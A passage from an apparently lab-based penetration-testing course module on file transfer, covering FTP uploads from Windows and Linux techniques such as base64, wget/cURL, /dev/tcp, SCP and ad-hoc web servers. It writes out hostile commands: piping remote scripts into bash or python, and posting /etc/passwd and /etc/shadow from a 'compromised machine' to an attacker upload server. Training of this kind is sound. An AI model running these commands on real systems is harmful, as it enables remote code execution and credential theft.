+<p>Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module <code>pyftpdlib</code>, we need to specify the option <code>--write</code> to allow clients to upload files to our attack host.</p>
+<pre><code class="lang-shell-session">[!bash!]$ sudo <span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> pyftpdlib --port <span class="hljs-number">21</span> --<span class="hljs-keyword">write</span>
+
+/usr/local/lib/<span class="hljs-keyword">python3</span>.<span class="hljs-number">9</span>/dist-packages/pyftpdlib/authorizers.<span class="hljs-keyword">py</span>:<span class="hljs-number">243</span>: RuntimeWarnin<span class="hljs-variable">g:</span> <span class="hljs-keyword">write</span> permissions assigned <span class="hljs-keyword">to</span> anonymous user.
+  warnings.warn(<span class="hljs-string">"write permissions assigned to anonymous user."</span>,
+[I <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">18</span> <span class="hljs-number">10</span>:<span class="hljs-number">33</span>:<span class="hljs-number">31</span>] concurrency <span class="hljs-keyword">mode</span><span class="hljs-variable">l:</span> async
+[I <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">18</span> <span class="hljs-number">10</span>:<span class="hljs-number">33</span>:<span class="hljs-number">31</span>] masquerade (NAT) addres<span class="hljs-variable">s:</span> None
+[I <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">18</span> <span class="hljs-number">10</span>:<span class="hljs-number">33</span>:<span class="hljs-number">31</span>] passive port<span class="hljs-variable">s:</span> None
+[I <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">18</span> <span class="hljs-number">10</span>:<span class="hljs-number">33</span>:<span class="hljs-number">31</span>] &gt;&gt;&gt; starting FTP server <span class="hljs-keyword">on</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">21</span>, pid=<span class="hljs-number">5155</span> &lt;&lt;&lt;
+</code></pre>
+<p>Now let's use the PowerShell upload function to upload a file to our FTP Server.</p>
+<p><strong>PowerShell Upload File</strong></p>
+<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc<span class="hljs-symbol">\h</span>osts')
+</code></pre>
+<p><strong>Create a Command File for the FTP Client to Upload a File</strong></p>
+<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
+C:<span class="hljs-symbol">\h</span>tb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
+C:<span class="hljs-symbol">\h</span>tb&gt; echo binary &gt;&gt; ftpcommand.txt
+C:<span class="hljs-symbol">\h</span>tb&gt; echo PUT c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc<span class="hljs-symbol">\h</span>osts &gt;&gt; ftpcommand.txt
+C:<span class="hljs-symbol">\h</span>tb&gt; echo bye &gt;&gt; ftpcommand.txt
+C:<span class="hljs-symbol">\h</span>tb&gt; ftp -v -n -s:ftpcommand.txt
+ftp&gt; open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp&gt; USER anonymous
+ftp&gt; PUT c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc<span class="hljs-symbol">\h</span>osts
+ftp&gt; bye
+</code></pre>
+<hr>
+<h3 id="recap">Recap</h3>
+<p>We discussed several methods for downloading and uploading files using Windows native tools, but there's more. In the following sections, we'll discuss other mechanisms and tools we can use to perform file transfer operations.</p>
+<h3 id="linux-file-transfer-methods">Linux File Transfer Methods</h3>
+<hr>
+<p>Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.</p>
+<p>A few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability. They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.</p>
+<p>The Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to use <code>cURL</code>. If that failed, it attempted to use <code>wget</code>, and if that failed, it used <code>Python</code>. All three methods use <code>HTTP</code> to communicate.</p>
+<p>Although Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses <code>HTTP</code> and <code>HTTPS</code> for communication.</p>
+<p>This section will review multiple ways to transfer files on Linux, including HTTP, Bash, SSH, etc.</p>
+<hr>
+<h3 id="download-operations">Download Operations</h3>
+<p>We have access to the machine <code>NIX04</code>, and we need to download a file from our <code>Pwnbox</code> machine. Let's see how we can accomplish this using multiple file download methods.</p>
+<p><img src="storage\modules\24\LinuxDownloadUpload.drawio.png" alt="image"></p>
+<h3 id="base64-encoding-decoding">Base64 Encoding / Decoding</h3>
+<p>Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.</p>
+<p><strong>Pwnbox - Check File MD5 hash</strong></p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ md5sum id_rsa
+
+<span class="hljs-number">4</span>e301756a07ded0a2dd6953abf015278  id_rsa
+</code></pre>
+<p>We use <code>cat</code> to print the file content, and base64 encode the output using a pipe <code>|</code>. We used the option <code>-w 0</code> to create only one line and ended up with the command with a semi-colon (;) and <code>echo</code> keyword to start a new line and make it easier to copy.</p>
+<p><strong>Pwnbox - Encode SSH Key to Base64</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ cat id_rsa |base<span class="hljs-number">64</span> -w <span class="hljs-number">0</span>;echo
+
+LS<span class="hljs-number">0</span>tLS<span class="hljs-number">1</span>CRUdJTiBPUEVOU<span class="hljs-number">1</span><span class="hljs-symbol">NIIFBSSVZBVEUgS0</span>VZLS<span class="hljs-number">0</span>tLS<span class="hljs-number">0</span>KYj<span class="hljs-symbol">NCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1</span>dmJtVUFBQUFFY<span class="hljs-name">m05</span>dVpRQUFBQUFBQUFBQkFBQUFsd<span class="hljs-number">0</span>FBQUFkemMyZ<span class="hljs-number">3</span>RjbgpOaEFBQUFBd<span class="hljs-number">0</span>VBQVFBQUFJRUF<span class="hljs-number">6</span>WjE<span class="hljs-number">0</span>dzV<span class="hljs-number">1</span><span class="hljs-symbol">NU9</span>laHR<span class="hljs-number">5</span>SUJQSk<span class="hljs-name">g3</span>T<span class="hljs-name">m9</span>Yai<span class="hljs-number">84</span>YX<span class="hljs-symbol">NHRUcxcHpJbmtiN2</span>hIMldRVGpMQWRYZE<span class="hljs-number">9</span>kC<span class="hljs-symbol">no3</span>YjJtd<span class="hljs-number">0</span>tiSW<span class="hljs-number">56</span>VmtT<span class="hljs-name">M1</span>BUR<span class="hljs-number">3</span>ZseGhDVkRRUmpBYzloQ<span class="hljs-number">3</span>k<span class="hljs-number">1</span>Q<span class="hljs-number">0</span>duW<span class="hljs-symbol">nlLM3</span>U<span class="hljs-number">2</span>TjQ<span class="hljs-number">3</span>RFhURFY<span class="hljs-number">0</span>YUtkcXl<span class="hljs-number">0</span>UTFUQXZZUHQwW<span class="hljs-name">m8</span>KVWh<span class="hljs-number">2</span>bE<span class="hljs-meta">o5</span>YUgxclgzVHUx<span class="hljs-name">M2</span>FRWU<span class="hljs-symbol">NQTVdMc2</span>JOV<span class="hljs-number">2</span>tLWFJzSk<span class="hljs-number">11</span>dTJO<span class="hljs-symbol">NkJoRHVmQThhc0</span>FBQUlRRGJXa<span class="hljs-number">3</span>p<span class="hljs-number">3</span>MjFwTThBQUFBSApj<span class="hljs-name">M05</span>vTFhKellRQUFBSUVBelox<span class="hljs-symbol">NHc1</span>dTVPZWh<span class="hljs-number">0</span>eUlCUEpI<span class="hljs-symbol">N05</span>vWGovOGFzR<span class="hljs-number">0</span>VHMXB<span class="hljs-number">6</span>SW<span class="hljs-number">5</span>rYjdoSDJXUVRqTEFkWGRPZH<span class="hljs-meta">o3</span>CmIybXdLYkluelZrUz<span class="hljs-symbol">NQVEd2</span>bHhoQ<span class="hljs-number">1</span>ZEUVJqQW<span class="hljs-name">M5</span>aE<span class="hljs-symbol">N5</span><span class="hljs-symbol">NUNHblp5</span>Sz<span class="hljs-symbol">N1</span><span class="hljs-symbol">Nk40</span><span class="hljs-symbol">N0</span>RYVERW<span class="hljs-symbol">NGFLZHF5</span>dFExVEF<span class="hljs-number">2</span>WVB<span class="hljs-number">0</span>MFpvVWgKdmxKOWFIMXJY<span class="hljs-name">M1</span>R<span class="hljs-number">1</span>MT<span class="hljs-symbol">NhUVlDUE1</span>XTH<span class="hljs-symbol">NiTldrS1</span>hSc<span class="hljs-number">0</span>p<span class="hljs-symbol">NdXUyTjZCaER1</span>ZkE<span class="hljs-number">4</span>YX<span class="hljs-symbol">NBQUFBREFRQUJBQUFBZ0</span><span class="hljs-symbol">NjQ28</span>zRHB<span class="hljs-attr">VSwpFdCtmWTZjY21</span>JelZhL<span class="hljs-number">2</span><span class="hljs-symbol">NEL1</span>hwTlRsRFZlaktkWVFib<span class="hljs-number">0</span>ZPUFc<span class="hljs-number">5</span>SjBxaUVoOEpyQWlxeXVlQT<span class="hljs-symbol">NNd1</span>hTWF<span class="hljs-symbol">N3</span>d<span class="hljs-number">3</span>BHMkpvOT<span class="hljs-symbol">NPCllVSnNxQXB4</span><span class="hljs-symbol">NlBxbFF6</span>K<span class="hljs-number">3</span>hK<span class="hljs-symbol">NjZEdzl5</span>RWF<span class="hljs-number">1</span>RTA<span class="hljs-number">5</span>OXpodEtpK<span class="hljs-number">0</span>pvMkttVzJzVE<span class="hljs-symbol">Nkbm92</span>Y<span class="hljs-number">3</span>BiK<span class="hljs-number">3</span>Q<span class="hljs-number">3</span>S<span class="hljs-number">2</span>lPcHlwY<span class="hljs-symbol">ndFZ0</span>dJWVkKZW<span class="hljs-number">9</span>VT<span class="hljs-number">2</span>hE<span class="hljs-symbol">NVJyY2</span>s<span class="hljs-number">5</span>Q<span class="hljs-number">3</span>J<span class="hljs-number">2</span>TlFBe<span class="hljs-name">m9</span>BeEFBQUFRUU<span class="hljs-symbol">NGKzBtTXJraklXL09</span>lc<span class="hljs-number">3</span>lJRC<span class="hljs-number">9</span>JQzJ<span class="hljs-symbol">NRGNuNTI0</span>S<span class="hljs-number">2</span><span class="hljs-symbol">NORUZ0</span><span class="hljs-symbol">NUk5</span>b<span class="hljs-number">0</span>ZJMApDcmdY<span class="hljs-symbol">NmNoSlNiVWJsVXFqVEx4</span><span class="hljs-symbol">NmIyblNmSlVWS3</span>pUMXRCVk<span class="hljs-number">1</span>tWEZ<span class="hljs-number">4</span>Vit<span class="hljs-number">0</span>K<span class="hljs-number">0</span>FBQUFRUURzbGZwM<span class="hljs-symbol">nJzVTdtaVMyQnhXWjBNCjY2</span>OEhxblp<span class="hljs-number">1</span>SWc<span class="hljs-number">3</span>WjVLU<span class="hljs-symbol">nFrK1</span>hqWkdqbHVJMkxjalRKZEd<span class="hljs-number">4</span>Z<span class="hljs-number">0</span>VBa<span class="hljs-symbol">nhuZEJqa0</span>F<span class="hljs-number">0</span>MExlOFphbUt<span class="hljs-number">5</span>blV<span class="hljs-number">2</span>aGU<span class="hljs-number">3</span>ekkzL<span class="hljs-number">0</span>FBQUEKUVFEZWZPSVF<span class="hljs-symbol">NZnQ0</span>R<span class="hljs-number">1</span><span class="hljs-symbol">NtaERreWJtbG1</span>IQXRkMUdYVitOQTRG<span class="hljs-symbol">NXQ0</span>UExZYzZOYWRIc<span class="hljs-number">0</span>JTWDJW<span class="hljs-symbol">N0</span>liaFA<span class="hljs-number">1</span>cS<span class="hljs-number">9</span>yV<span class="hljs-name">m5</span>tVHJRZApaUkVJTW<span class="hljs-number">84</span><span class="hljs-symbol">NzRMUkJrY0</span>FqUlZBQUFBRkhCc<span class="hljs-number">1</span>lXbHVkR<span class="hljs-number">1</span>Y<span class="hljs-number">0</span>ZE<span class="hljs-attr">VCamVXSmxjbk53</span>WVdObEFRSURCQVVHCi<span class="hljs-number">0</span>tLS<span class="hljs-number">0</span>tRU<span class="hljs-number">5</span>EIE<span class="hljs-number">9</span>QRU<span class="hljs-number">5</span>TU<span class="hljs-number">0</span>ggUFJJVkFURSBLRVktLS<span class="hljs-number">0</span>tLQo=
+</code></pre>
+<p>We copy this content, paste it onto our Linux target machine, and use <code>base64</code> with the option `-d' to decode it.</p>
+<p><strong>Linux - Decode the File</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">echo</span> -n <span class="hljs-string">'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo='</span> | base64 <span class="hljs-_">-d</span> &gt; id_rsa
+</code></pre>
+<p>Finally, we can confirm if the file was transferred successfully using the <code>md5sum</code> command.</p>
+<p><strong>Linux - Confirm the MD5 Hashes Match</strong></p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ md5sum id_rsa
+
+<span class="hljs-number">4</span>e301756a07ded0a2dd6953abf015278  id_rsa
+</code></pre>
+<p>Note: You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.</p>
+<h3 id="web-downloads-with-wget-and-curl">Web Downloads with Wget and cURL</h3>
+<p>Two of the most common utilities in Linux distributions to interact with web applications are <code>wget</code> and <code>curl</code>. These tools are installed on many Linux distributions.</p>
+<p>To download a file using <code>wget</code>, we need to specify the URL and the option `-O' to set the output filename.</p>
+<p><strong>Download a File Using wget</strong></p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ wget https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/rebootuser</span><span class="hljs-regexp">/LinEnum/master</span><span class="hljs-regexp">/LinEnum.sh -O /tmp</span><span class="hljs-regexp">/LinEnum.sh</span>
+</code></pre>
+<p><code>cURL</code> is very similar to <code>wget</code>, but the output filename option is lowercase `-o'.</p>
+<p><strong>Download a File Using cURL</strong></p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl -o /tmp</span><span class="hljs-regexp">/LinEnum.sh https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/rebootuser</span><span class="hljs-regexp">/LinEnum/master</span><span class="hljs-regexp">/LinEnum.sh</span>
+</code></pre>
+<hr>
+<h3 id="fileless-attacks-using-linux">Fileless Attacks Using Linux</h3>
+<p>Because of the way Linux works and how <a href="https://www.geeksforgeeks.org/piping-in-unix-or-linux/">pipes operate</a>, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.</p>
+<p>Note: Some payloads such as <code>mkfifo</code> write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.</p>
+<p>Let's take the <code>cURL</code> command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.</p>
+<p><strong>Fileless Download with cURL</strong></p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/rebootuser</span><span class="hljs-regexp">/LinEnum/master</span><span class="hljs-regexp">/LinEnum.sh | bash</span>
+</code></pre>
+<p>Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using <code>wget</code>.</p>
+<p><strong>Fileless Download with wget</strong></p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ wget -qO- https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/juliourena</span><span class="hljs-regexp">/plaintext/master</span><span class="hljs-regexp">/Scripts/helloworld</span>.py | python3
+
+Hello World!
+</code></pre>
+<hr>
+<h3 id="download-with-bash-dev-tcp-">Download with Bash (/dev/tcp)</h3>
+<p>There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.</p>
+<p><strong>Connect to the Target Webserver</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ exec <span class="hljs-number">3</span>&lt;&gt;/dev/tcp/<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.32</span>/<span class="hljs-number">80</span>
+</code></pre>
+<p><strong>HTTP GET Request</strong></p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ echo -e <span class="hljs-string">"<span class="hljs-keyword">GET</span> /LinEnum.sh HTTP/1.1\n\n"</span>&gt;&amp;<span class="hljs-number">3</span>
+</code></pre>
+<p><strong>Print the Response</strong></p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ cat &lt;&amp;<span class="hljs-number">3</span>
+</code></pre>
+<hr>
+<h3 id="ssh-downloads">SSH Downloads</h3>
+<p>SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an <code>SCP</code> utility for remote file transfer that, by default, uses the SSH protocol.</p>
+<p><code>SCP</code> (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.</p>
+<p><code>SCP</code> is very similar to <code>copy</code> or <code>cp</code>, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.</p>
+<p>Before we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.</p>
+<p><strong>Enabling the SSH Server</strong></p>
+<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ sudo systemctl enable ssh
+
+Synchronizing state of ssh.service with SysV service script with /lib</span><span class="hljs-regexp">/systemd/systemd</span>-sysv-install.
+<span class="hljs-symbol">Executing:</span> /<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">systemd</span>/<span class="hljs-title">systemd</span>-<span class="hljs-title">sysv</span>-<span class="hljs-title">install</span> <span class="hljs-title">enable</span> <span class="hljs-title">ssh</span></span>
+Use <span class="hljs-keyword">of</span> uninitialized value $service in hash element at /usr/sbin/update-rc.d line <span class="hljs-number">26</span>, &lt;DATA&gt; line <span class="hljs-number">45</span>
+...SNIP...
+</code></pre>
+<p><strong>Starting the SSH Server</strong></p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo systemctl start ssh
+</code></pre>
+<p><strong>Checking for SSH Listening Port</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ netstat -lnpt
+
+(Not <span class="hljs-keyword">all</span> processes could <span class="hljs-keyword">be</span> identified, non-owned process info
+ will not <span class="hljs-keyword">be</span> shown, you would have <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> root <span class="hljs-keyword">to</span> see it <span class="hljs-keyword">all</span>.)
+Active Internet connections (<span class="hljs-keyword">only</span> servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">22</span>              <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:*               LISTEN      -
+</code></pre>
+<p>Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.</p>
+<p><strong>Linux - Downloading Files Using SCP</strong></p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ scp plaintext@<span class="hljs-number">192.168.49.128</span>:/root/myroot.txt .
+</code></pre>
+<p>Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.</p>
+<hr>
+<h3 id="upload-operations">Upload Operations</h3>
+<p>There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.</p>
+<hr>
+<h3 id="web-upload">Web Upload</h3>
+<p>As mentioned in the <code>Windows File Transfer Methods</code> section, we can use <a href="https://github.com/Densaugeo/uploadserver">uploadserver</a>, an extended module of the Python <code>HTTP.Server</code> module, which includes a file upload page. For this Linux example, let's see how we can configure the <code>uploadserver</code> module to use <code>HTTPS</code> for secure communication.</p>
+<p>The first thing we need to do is to install the <code>uploadserver</code> module.</p>
+<p><strong>Pwnbox - Start Web Server</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo python3 -m pip <span class="hljs-keyword">install</span> <span class="hljs-comment">--user uploadserver</span>
+
+Collecting uploadserver
+  <span class="hljs-keyword">Using</span> cached uploadserver<span class="hljs-number">-2.0</span><span class="hljs-number">.1</span>-py3-<span class="hljs-keyword">none</span>-any.whl (<span class="hljs-number">6.9</span> kB)
+Installing collected packages: uploadserver
+Successfully installed uploadserver<span class="hljs-number">-2.0</span><span class="hljs-number">.1</span>
+</code></pre>
+<p>Now we need to create a certificate. In this example, we are using a self-signed certificate.</p>
+<p><strong>Pwnbox - Create a Self-Signed Certificate</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:<span class="hljs-number">2048</span> -nodes -sha256 -subj <span class="hljs-string">'/CN=server'</span>
+
+Generating a RSA private key
+................................................................................+++++
+.......+++++
+writing new private key to <span class="hljs-string">'server.pem'</span>
+-----
+</code></pre>
+<p>The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.</p>
+<p><strong>Pwnbox - Start Web Server</strong></p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ mkdir https &amp;&amp; cd https
+</code></pre>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo python3 -m uploadserver <span class="hljs-number">443</span> --server-certificate ~/server.pem
+
+File upload available <span class="hljs-meta">at</span> /upload
+Serving HTTPS on <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">443</span> (https://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">443</span>/) ...
+</code></pre>
+<p>Now from our compromised machine, let's upload the <code>/etc/passwd</code> and <code>/etc/shadow</code> files.</p>
+<p><strong>Linux - Upload Multiple Files</strong></p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl -X POST https:/</span><span class="hljs-regexp">/192.168.49.128/upload</span> -F <span class="hljs-string">'files=@/etc/passwd'</span> -F <span class="hljs-string">'files=@/etc/shadow'</span> --insecure
+</code></pre>
+<p>We used the option <code>--insecure</code> because we used a self-signed certificate that we trust.</p>
+<hr>
+<h3 id="alternative-web-file-transfer-method">Alternative Web File Transfer Method</h3>
+<p>Since Linux distributions usually have <code>Python</code> or <code>php</code> installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.</p>
+<p>It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.</p>
+<p><strong>Linux - Creating a Web Server with Python3</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 -m http.server
+
+Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">8000</span> (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span>/) ...
+</code></pre>
+<p><strong>Linux - Creating a Web Server with Python2.7</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python2<span class="hljs-meta">.7</span> -m SimpleHTTPServer
+
+Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">8000</span> (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span>/) ...
+</code></pre>
+<p><strong>Linux - Creating a Web Server with PHP</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ php -S <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span>
+
+[Fri May <span class="hljs-number">20</span> <span class="hljs-number">08</span>:<span class="hljs-number">16</span>:<span class="hljs-number">47</span> <span class="hljs-number">2022</span>] PHP <span class="hljs-number">7.4</span><span class="hljs-meta">.28</span> Development Server (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span>) started
+</code></pre>
+<p><strong>Linux - Creating a Web Server with Ruby</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ruby -run -ehttpd . -p8000
+
+[2022<span class="hljs-string">-05</span><span class="hljs-string">-23</span> 09:35:46] INFO  WEBrick 1.6.1
+[2022<span class="hljs-string">-05</span><span class="hljs-string">-23</span> 09:35:46] INFO  ruby 2.7.4 (2021<span class="hljs-string">-07</span><span class="hljs-string">-07</span>) [x86_64-linux-gnu]
+[2022<span class="hljs-string">-05</span><span class="hljs-string">-23</span> 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
+</code></pre>
+<p><strong>Download the File from the Target Machine onto the Pwnbox</strong></p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ wget 192.168.49.128:8000/</span>filetotransfer.txt
+
+-<span class="hljs-number">-2022</span><span class="hljs-number">-05</span><span class="hljs-number">-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">05</span>--  <span class="hljs-string">http:</span><span class="hljs-comment">//192.168.49.128:8000/filetotransfer.txt</span>
+Connecting to <span class="hljs-number">192.168</span><span class="hljs-number">.49</span><span class="hljs-number">.128</span>:<span class="hljs-number">8000.</span>.. connected.
+HTTP request sent, awaiting response... <span class="hljs-number">200</span> OK
+<span class="hljs-string">Length:</span> <span class="hljs-number">0</span> [text/plain]
+Saving <span class="hljs-string">to:</span> <span class="hljs-string">'filetotransfer.txt'</span>
+
+filetotransfer.txt                       [ &lt;=&gt;                                                                  ]       <span class="hljs-number">0</span>  --.-KB/s    <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>s      
+
